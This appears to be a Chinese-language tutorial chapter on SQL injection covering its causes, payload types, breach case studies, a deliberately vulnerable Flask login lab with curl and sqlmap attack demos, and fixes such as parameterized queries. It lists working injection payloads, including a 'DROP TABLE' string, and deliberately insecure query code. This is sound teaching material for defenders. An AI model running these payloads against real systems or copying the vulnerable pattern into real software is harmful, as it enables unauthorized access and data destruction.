# SQL 注入（SQL Injection）

> **一句话定义**：攻击者通过将恶意 SQL 代码注入到应用程序的 SQL 查询中，从而操控数据库执行非授权的操作。

**危险等级**：🔴 严重
**OWASP Top 10 2021**：A03 — Injection（第 3 位）

---

## 原理深度分析

### 为什么发生

SQL 注入的根本原因是**用户输入被拼接到 SQL 查询中，而没有与 SQL 代码区分开**。

```sql
-- 正常查询：查找用户名为 "admin" 的用户
SELECT * FROM users WHERE username = 'admin' AND password = '123456';

-- 攻击者输入：username = admin' -- 
-- 拼接后的查询：
SELECT * FROM users WHERE username = 'admin' -- ' AND password = '任意值'

-- 注意：-- 是 SQL 注释符，后面的条件被注释掉了！
```

### 攻击原理图解

```
用户输入 ──→ 拼接 SQL ──→ 数据库执行
   │                        │
   └── 恶意 SQL 代码         └── 执行了攻击者控制的逻辑
```

当应用代码这样写时：

```python
# 🔴 有漏洞的代码 — 直接拼接用户输入
username = request.GET['username']
password = request.GET['password']
sql = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
cursor.execute(sql)
```

攻击者输入 `admin' --` 作为用户名，SQL 就变成了：

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'xxx'
```

— 密码校验被完全绕过。

### 常见注入类型

| 类型 | 描述 | 利用方式 |
|------|------|---------|
| 经典 SQLi | 通过拼接直接注入 | `' OR 1=1 --` |
| 盲注 (Blind) | 页面不显示数据，通过布尔/时间判断 | `' AND SLEEP(5) --` |
| 报错注入 | 通过数据库错误信息泄露数据 | `' AND EXTRACTVALUE(...) --` |
| 联合查询注入 | 用 UNION 合并结果集 | `' UNION SELECT ... --` |
| 堆叠查询 | 执行多条 SQL 语句 | `'; DROP TABLE users --` |

---

## 真实世界案例

### 案例 1：TalkTalk 黑客事件（2015）

英国电信公司 TalkTalk 遭受 SQL 注入攻击，导致 **15.7 万**客户的个人数据泄露，包括姓名、地址、电话号码和银行账户信息。

- **攻击方式**：攻击者通过网站的一个搜索功能利用 SQL 注入
- **损失**：公司损失约 **4200 万英镑**，股价暴跌
- **教训**：一个简单的搜索框参数未过滤，导致数千万英镑的损失

### 案例 2：Heartland Payment Systems（2008）

支付处理公司 Heartland 被 SQL 注入攻击，泄露了 **1.3 亿**张信用卡信息。

- **攻击方式**：攻击者通过 SQL 注入在数据库服务器上安装恶意软件
- **损失**：公司支付了 **1.45 亿美元**的罚款和和解费
- **教训**：即使通过网络应用，SQL 注入也能导致底层服务器的完全失陷

### 案例 3：索尼 PlayStation 网络（2011）

索尼 PlayStation Network 被 SQL 注入攻击，导致 **7700 万**用户的个人信息泄露。

- **攻击方式**：攻击者通过 SQL 注入获得数据库访问权限
- **后果**：PSN 下线 23 天，索尼承受了数十亿美元的损失

---

## 简单 POC

### 环境准备

搭建最简单的测试环境——一个 Flask 应用 + SQLite：

```bash
pip install flask
```

### 靶场代码（有漏洞）

```python
# app.py — 有漏洞的登录页面
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route('/login')
def login():
    username = request.args.get('username', '')
    password = request.args.get('password', '')
    
    conn = sqlite3.connect(':memory:')
    conn.execute("CREATE TABLE users (username text, password text)")
    conn.execute("INSERT INTO users VALUES ('admin', 'supersecret123')")
    
    # 🔴 漏洞：直接拼接用户输入
    sql = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    print(f"[SQL] {sql}")
    
    cursor = conn.execute(sql)
    user = cursor.fetchone()
    
    if user:
        return f"登录成功！欢迎 {user[0]}"
    return "登录失败"

if __name__ == '__main__':
    app.run(port=5000)
```

### 攻击演示

```bash
# 正常登录 — 失败
curl "http://localhost:5000/login?username=admin&password=wrong"
# 返回：登录失败

# SQL 注入攻击 — 绕过密码
curl "http://localhost:5000/login?username=admin'%20--&password=anything"
# 返回：登录成功！欢迎 admin

# 万能密码攻击
curl "http://localhost:5000/login?username='%20OR%20'1'='1&password='%20OR%20'1'='1"
# 返回：登录成功！欢迎 admin

# 数据泄露 — 获取所有表名（SQLite）
curl "http://localhost:5000/login?username='%20UNION%20SELECT%20name,sql%20FROM%20sqlite_master%20WHERE%20type='table'%20--&password=x"
```

### 自动化利用

使用 `sqlmap` 自动化检测和利用：

```bash
# 安装
pip install sqlmap

# 检测
sqlmap -u "http://localhost:5000/login?username=admin&password=test"

# 获取数据库列表
sqlmap -u "http://localhost:5000/login?username=admin&password=test" --dbs

# 获取表
sqlmap -u "http://localhost:5000/login?username=admin&password=test" --tables -D testdb
```

---

## 修复方案

### 方案 1：参数化查询（Prepared Statements）⭐⭐⭐⭐⭐

**最有效、最推荐的防御方式。**

```python
# ✅ 修复：使用参数化查询
@app.route('/login_fixed')
def login_fixed():
    username = request.args.get('username', '')
    password = request.args.get('password', '')
    
    conn = sqlite3.connect(':memory:')
    conn.execute("CREATE TABLE IF NOT EXISTS users (username text, password text)")
    conn.execute("INSERT INTO users VALUES ('admin', 'supersecret123')")
    
    # ✅ 参数化查询 — 用户输入被当作数据，不是 SQL 代码
    sql = "SELECT * FROM users WHERE username = ? AND password = ?"
    print(f"[SQL] {sql} with params: {username!r}, {password!r}")
    
    cursor = conn.execute(sql, (username, password))
    user = cursor.fetchone()
    
    if user:
        return f"登录成功！欢迎 {user[0]}"
    return "登录失败"
```

**在其他语言中的参数化查询：**

```java
// Java JDBC
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ? AND password = ?"
);
ps.setString(1, username);
ps.setString(2, password);
ResultSet rs = ps.executeQuery();
```

```php
// PHP PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :user AND password = :pass");
$stmt->execute(['user' => $username, 'pass' => $password]);
```

```csharp
// C# Entity Framework (自动参数化)
var user = db.Users.FirstOrDefault(u => 
    u.Username == username && u.Password == password);
```

### 方案 2：输入验证与转义 ⭐⭐⭐⭐

**辅助防御，不能单独依赖。**

```python
import re

def is_safe_username(username):
    """只允许字母、数字和下划线"""
    return bool(re.match(r'^[a-zA-Z0-9_]+$', username))

# 在拼接前验证
if not is_safe_username(username):
    return "无效的用户名"
```

### 方案 3：最小权限原则 ⭐⭐⭐⭐

```sql
-- 不要用 sa/root 连接数据库
-- 应用数据库用户只给最小权限
CREATE USER 'app_user'@'%' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE, DELETE ON app_db.* TO 'app_user'@'%';
-- 绝对不要给 DROP、CREATE、FILE 等危险权限
```

### 方案 4：ORM 框架 ⭐⭐⭐

**ORM 通常自动处理参数化，但也有例外**。

```python
# Django ORM — 安全
from django.contrib.auth.models import User
user = User.objects.filter(username=username, password=password).first()

# 🔴 危险：.extra() 和原生 SQL
User.objects.extra(where=[f"username = '{username}'"])  # 危险！
```

---

## 检测与防御工具

### 主动检测

| 工具 | 类型 | 用途 |
|------|------|------|
| [sqlmap](https://sqlmap.org/) | 自动化利用 | 检测和利用 SQL 注入 |
| [OWASP ZAP](https://www.zaproxy.org/) | 扫描器 | 被动/主动扫描 |
| [Burp Suite](https://portswigger.net/burp) | 代理 | 手工测试 + 扫描 |
| [SQLCheck](https://github.com/jarulraj/sqlcheck) | 静态分析 | 检测代码中的危险 SQL |

### WAF 防御

```nginx
# Nginx + ModSecurity WAF 规则示例
# 禁止 SQL 注入常用 payload
location / {
    if ($query_string ~* "(%27)|(')|(--)|(%23)|(#)") {
        return 403;
    }
}
```

> **⚠️ 注意**：WAF 只是辅助防御，不能替代代码层面的参数化查询。攻击者总在寻找 WAF 绕过方式。

---

## 延伸阅读

1. [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
2. [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
3. [OWASP Testing Guide - SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
4. [SQL Injection - Wikipedia](https://en.wikipedia.org/wiki/SQL_injection)
5. [SQLMap Wiki](https://github.com/sqlmapproject/sqlmap/wiki)

*下一篇：[XSS 跨站脚本（Cross-Site Scripting）](02-xss.md)*
